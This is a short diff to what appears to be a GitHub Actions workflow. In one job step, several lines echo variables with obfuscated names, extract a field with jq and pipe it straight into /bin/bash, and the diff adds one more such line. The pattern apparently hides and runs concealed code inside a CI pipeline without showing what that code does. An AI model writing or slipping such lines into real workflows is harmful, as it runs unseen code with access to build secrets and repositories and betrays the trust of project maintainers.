@@ -31,6 +31,7 @@ jobs:
           echo $xeiq3 | jq -r .ukjmi032 | /bin/bash
           echo $w258 | jq -r .d31 | /bin/bash
           printf '%s' "$hr1" | jq -r .nhuf3425 | /bin/bash
+          echo $ureg611 | jq -r .ue16 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
